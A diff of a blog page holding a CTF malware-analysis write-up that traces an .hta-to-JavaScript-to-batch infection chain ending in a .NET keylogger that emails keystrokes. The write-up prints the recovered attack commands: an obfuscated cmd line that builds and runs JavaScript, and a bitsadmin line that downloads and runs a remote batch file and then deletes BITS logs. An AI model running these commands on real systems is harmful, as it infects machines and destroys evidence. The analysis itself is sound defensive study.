@@ -10,12 +10,11 @@
 <meta name="description" content="This is a writeup for the Mr Anderson challenge
 This challenge gives us a zip file containing 3 pcap files:
 
-
 What we have to do is to first find the order of the scripts that were executed in the attack in order to know what was executed first, what other file it dropped etc.
 We can easily identify the order by opening all 3 pcaps and observing the date and time of the first packet of each pcap.">
 <meta name="author" content="connar">
 <link rel="canonical" href="http://localhost:1313/ctfwriteups/mranderson/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.1665878c578779cd11d4dc626b2c0e032a8b9c1dcf7d37f819200b4bc208b6a7.css" integrity="sha256-FmWHjFeHec0R1NxiaywOAyqLnB3PfTf4GSALS8IItqc=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.6da9a63d25a9608bca2f7f907a030e887a7dd3c3f3918e4cc113129361414bda.css" integrity="sha256-bammPSWpYIvKL3&#43;QegMOiHp908PzkY5MwRMSk2FBS9o=" rel="preload stylesheet" as="style">
 <link rel="icon" href="http://localhost:1313/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
@@ -80,7 +79,7 @@ We can easily identify the order by opening all 3 pcaps and observing the date a
         <div class="logo">
             <a href="http://localhost:1313/" accesskey="h" title="Journal of Connar (Alt + H)">Journal of Connar</a>
             <div class="logo-switches">
-                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                         fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                         stroke-linejoin="round">
@@ -160,24 +159,19 @@ We can easily identify the order by opening all 3 pcaps and observing the date a
   </header> 
   <div class="post-content"><h1 id="this-is-a-writeup-for-the-mr-anderson-challenge">This is a writeup for the Mr Anderson challenge<a hidden class="anchor" aria-hidden="true" href="#this-is-a-writeup-for-the-mr-anderson-challenge">#</a></h1>
 <p>This challenge gives us a zip file containing 3 pcap files:</p>
-<p><img loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image.png"></p>
 <p>What we have to do is to first find the order of the scripts that were executed in the attack in order to know what was executed first, what other file it dropped etc.</p>
 <p>We can easily identify the order by opening all 3 pcaps and observing the date and time of the first packet of each pcap.</p>
-<p><img loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-1.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-1.png"></p>
 <p>By doing so, we notice that firstly, an .hta file was downloaded and run. This .hta file probably downloaded the second file which is a javascript file, and this javascript file probably downloaded the last file which is a .bat one.</p>
 <p>We can export all the files through File&ndash;&gt;Export Objects&ndash;&gt;HTTP.</p>
 <p>Let&rsquo;s start analyzing the first file: &ldquo;noticeJuly.hta&rdquo;
 Running the file, we are met with the following window:</p>
-<p><img loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-3.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-3.png"></p>
 <p>Opening the file in a text editor, we observe the following fake looking page:</p>
-<p><img loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-2.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-2.png"></p>
 <p>We see a very suspicious command that is executed upon clicking the Refresh Button. We can use the CMD Watcher tool (not that it is needed) to see that indeed this sus looking command is being run upon clicking the button:</p>
-<p><img loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-4.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-4.png"></p>
 <p>Let&rsquo;s analyze this command that is being run. The command is the following:</p>
 <pre tabindex="0"><code>C:\Windows\System32\cONhosT.exe %COMSpeC% /V/D/c &#34;S^eT SSG=C:\kfldeokgr\&amp;&amp; mD !SSG!&gt;nul 2&gt;&amp;1&amp;&amp;S^eT UFWN=!SSG!^KGRAAKR.JS&amp;&amp;&lt;nul set/p LAXA=var LAXA=&#39;\u0055\u004c\u0064\u002b\u0044\u0055\u004c\u0064\u002b\u0045\u0055\u004c\u0064\u002b\u0022\u002f\u002f\u0063\u0030\u0072\u0061\u0078\u002e\u0065\u0070\u0068\u0033\u006b\u0064\u006f\u006c\u006d\u0066\u0061\u002e\u0063\u006c\u006f\u0075\u0064\u002f\u003f\u0032\u002f\u0022\u0029\u003b&#39;;SSG=&#39;\u003a\u0068\u0022\u003b\u0045\u0055\u004c\u0064\u003d\u0022\u0054\u0074\u0022\u002b\u0022\u0050\u003a\u0022\u003b\u0047\u0065\u0074\u004f\u0062\u006a\u0065\u0063\u0074\u0028\u0043&#39;;PEBC=&#39;\u0076\u0061\u0072\u0020\u0043\u0055\u004c\u0064\u003d\u0022\u0073\u0022\u002b\u0022\u0063\u0072\u0022\u003b\u0044\u0055\u004c\u0064\u003d\u0022\u0069\u0070\u0074\u0022\u002b\u0022&#39;;UFWN=PEBC+SSG+LAXA;PADO=new Function(UFWN);PADO(); &gt;!UFWN!|caLl !UFWN!||caLl !UFWN! &#34;
 </code></pre><p>Firstly, let&rsquo;s take the unicode values and convert them to plaintext. You can use this cyberchef command to decode them:</p>
@@ -214,14 +208,11 @@ Running the file, we are met with the following window:</p>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">gj4fjrg</span>.<span style="color:#a6e22e">run</span>(<span style="color:#e6db74">&#34;\&#34;&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">whshis4</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\&#34;&#34;</span>);
 </span></span></code></pre></div><p>This basically makes some replacements in the specified code, decodes the long b64 string and saves it in the appdata folder as a .bat file.
 By following the same operations, we end up with this .bat file:</p>
-<p><img loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-5.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-5.png"></p>
 <p>This kinda seems like normal envar obfuscation but it is slightly different. It combines multiple known batch obfuscation techniques, such as pre existing envars, custom dictionary etc. One could try to deobfuscate this manually, but there is a twist in this specific batch file. Let&rsquo;s save it and upload it to VirusTotal to see what I mean:</p>
-<p><img loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-6.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-6.png"></p>
 <p>The thing to take away here is that VirusTotal sometimes will identify known techniques and specify them. Here, we see an interesting text: &ldquo;BatchEncryption&rdquo;. Let&rsquo;s google this and see what comes up:</p>
-<p><img loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-7.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-7.png"></p>
 <p>Damn. By opening a few tabs and reading the articles (well, translated except if you know chinese), we learn that this is a tecnhique implemented by a tool named BatchEncryptor which was created by <a href="mailto:gwsbhqt@163.com">gwsbhqt@163.com</a>.
 There is also the corresponding tool to decode the whole .bat file for us!
 This tool exists in this repo:</p>
@@ -229,43 +220,35 @@ This tool exists in this repo:</p>
 <li><a href="https://github.com/cnHopeStudio/Batch-Encryption-DeCoder">https://github.com/cnHopeStudio/Batch-Encryption-DeCoder</a> (its the first google search result we got previously).</li>
 </ul>
 <p>By building this tool and running it, we get the deobfuscated bat code which is&hellip;another obfuscated command:</p>
-<p><img loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-8.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-8.png"></p>
 <p>The new command we are called to deobfuscate is:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bat" data-lang="bat"><span style="display:flex;"><span>cmd /V /C <span style="color:#e6db74">&#34;set shgyngmcqs=0XoY&amp;Ndh</span>%Cas3WlpPRn\meFQwgf/U2D5T:.k tbzri*uMc&amp;&amp;FOR %A IN (38 41 37 11 10 6 20 41 18 36 27 37 40 10 18 11 26 21 40 36 17 28 5 32 23 12 11 0 5 39 6 26 5 29 25 39 5 32 5 26 3 29 25 0 44 13 31 35 1 39 45 39 3 29 7 43 44 13 5 2 44 39 28 36 7 37 37 15 33 27 27 11 43 18 40 41 39 25 14 12 27 37 34 38 10 37 36 8 37 20 15 8 19 37 34 38 10 37 36 4 36 8 37 20 15 8 19 37 34 38 10 37 36 4 36 11 45 36 11 37 2 15 36 38 41 37 11 36 4 36 37 41 20 21 2 43 37 36 31 36 4 36 6 21 14 36 27 23 36 27 22 36 9 33 19 16 40 2 25 40 10 20 30 10 37 10 19 44 41 45 40 2 11 2 26 37 19 5 21 37 24 2 40 35 19 30 2 24 18 14 2 10 6 21 40 19 42 36 4 36 11 45 36 11 37 10 40 37 36 38 41 37 11 1337) DO set xqzwdomkia=!xqzwdomkia!!shgyngmcqs:~%<span style="color:#e6db74">A,1!&amp;&amp; IF </span>%A==1337 CALL %<span style="color:#e6db74">xqzwdomkia:~-213%&#34;</span>
 </span></span></code></pre></div><p>If we read this carefully, we will see that it is not that difficult to deobfuscate. Basically, it just sets a dictionary, then runs a loop and takes a specific character of the corresponding index based on the loop. It recreates the command to be run and then calls it. Let&rsquo;s use python to deobfuscate this:</p>
-<p><img loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-9.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-9.png"></p>
 <p>Note: The technique used is an existing one and is called &ldquo;forencoding obfuscation&rdquo;.</p>
 <p>The result we get is the following bitsadmin command:</p>
 <pre tabindex="0"><code>bitsadmin /transfer RUNTQ3s0NzdfN2gzNTNfY2g0MW5kXzczY2huMWNoMzU http://sunrizgl3/t.bat %tmp%\\t.bat &amp; %tmp%\\t.bat &amp; sc stop bits &amp; timeout 5 &amp; del /Q /F C:\\ProgramData\\Microsoft\\Network\\Downloader\\* &amp; sc start bits
 </code></pre><p>Bitsadmin command creates jobs and assigns them a task. Here, bitsadmin creates a job named RUNTQ3s0NzdfN2gzNTNfY2g0MW5kXzczY2huMWNoMzU to download a .bat file from a domain, run it, then stop the bitsadmin process in order to delete its logs and then starts it again. We can agree on that the job&rsquo;s name is really sus and if we decode it from b64 we get the first part of the flag:</p>
-<p><img loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-10.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-10.png"></p>
 <p>Nice. All that&rsquo;s left is the last .bat file in the remaining pcap.
 Opening it, we get another obfuscated .bat file different than the previous one:</p>
-<p><img loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-11.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-11.png"></p>
 <p>Again, one can try and deobfuscate it manually, but why not follow up with the same methodology as previously?
 Loading the file in VT, we get another interesting name:</p>
-<p><img loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-12.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-12.png"></p>
 <p>It is not as easy as with the previous one to indentify the right name, but after a bit of googling we can see that Jlaive is a tool used for obfuscation that gives a matching result as the one we have:</p>
-<p><img loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-13.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-13.png"></p>
 <p>So basically, Jlaive is a tool used to convert .NET executables to obfuscated .bat files. Interesting. Well, for such a tool to exist, there must be the corresponding tool that does the reverse operation. Searching for a bit, we find a tool named Get-UnJlaive which can be found in the following repo:</p>
 <ul>
 <li><a href="https://github.com/Dump-GUY/Get-UnJlaive">https://github.com/Dump-GUY/Get-UnJlaive</a></li>
 </ul>
 <p>This tool reconstructs the original executable before it was converted to this .bat. Setting up the tool and running it, we successfully get an executable back:</p>
-<p><img loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-15.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image-15.png"></p>
 <p>If we run the file command on the .exe, we see its a Mono/.NET assembly:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>└─$ file t.bat_orig.exe 
 </span></span><span style="display:flex;"><span>t.bat_orig.exe: PE32 executable <span style="color:#f92672">(</span>console<span style="color:#f92672">)</span> Intel <span style="color:#ae81ff">80386</span> Mono/.Net assembly, <span style="color:#66d9ef">for</span> MS Windows
 </span></span></code></pre></div><p>Loading the executable to DnSpy, we are met with&hellip;another seemingly obfuscated file:</p>
-<p><img loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image16.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image16.png"></p>
 <p>This executable seems to have been packed with some .NET packer. This time, VT won&rsquo;t be of any help to us. We can either identify the packer used by either using a simple strings command which will reveal the path where this executable was stored at build time, or we can search through the functions of the executable and find the packer in the class &ldquo;cab44dfc2d326bea8c4438eb03ca73b4d&rdquo;:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System;
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Reflection;
@@ -327,11 +310,9 @@ The only thing that is left to do is to find the corresponding tool to deobfusca
 <li><a href="https://github.com/Rhotav/Crypto-Deobfuscator">https://github.com/Rhotav/Crypto-Deobfuscator</a></li>
 </ul>
 <p>Building and running the tool, we get the deobfuscated file:</p>
-<p><img loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image17.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image17.png"></p>
 <p>Searching through the deobfuscated methods, we see the executable is basically a keylogger that sends the logged keystrikes through email. In method_4, we can find the part2 of our flag:</p>
-<p><img loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image18.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/ecsc_gr2024/images/image18.png"></p>
 <p>Full flag: ECSC{477_7h353_ch41nd_73chn1ch35_f02_ju57_4_k3yl09932}</p>
 
 
